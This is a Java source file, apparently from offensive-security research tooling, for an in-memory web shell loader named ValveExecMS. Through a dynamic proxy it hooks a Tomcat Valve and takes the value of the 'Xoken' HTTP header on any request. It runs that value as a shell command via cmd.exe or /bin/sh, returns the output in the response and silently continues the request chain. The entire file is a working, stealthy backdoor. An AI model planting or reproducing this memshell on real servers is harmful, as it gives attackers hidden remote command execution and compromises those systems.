package com.demo.memshell.loader;


import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
public class ValveExecMS implements InvocationHandler {

    private static String HEADER = "Xoken";
    private Object targetObject;


    public ValveExecMS() {
    }

    public ValveExecMS(Object targetObject) {
        this.targetObject = targetObject;
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("invoke")) {
            try {
                run(args[0], args[1]);
            } catch (Exception e) {

            }
            Class clazz = (Class) getFieldValue(method, "clazz");
            Object valve = clazz.getMethod("getNext").invoke(targetObject, null);
            invokeMethod(valve, "invoke", new Class[]{args[0].getClass(), args[1].getClass()}, new Object[]{args[0], args[1]});
        } else {
            return method.invoke(targetObject, args);
        }
        return null;
    }

    public void run(Object request, Object response) {
        try {
            String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            String result = exec(header);
            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
        } catch (Exception e) {

        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        return method.invoke(obj, args);
    }
}
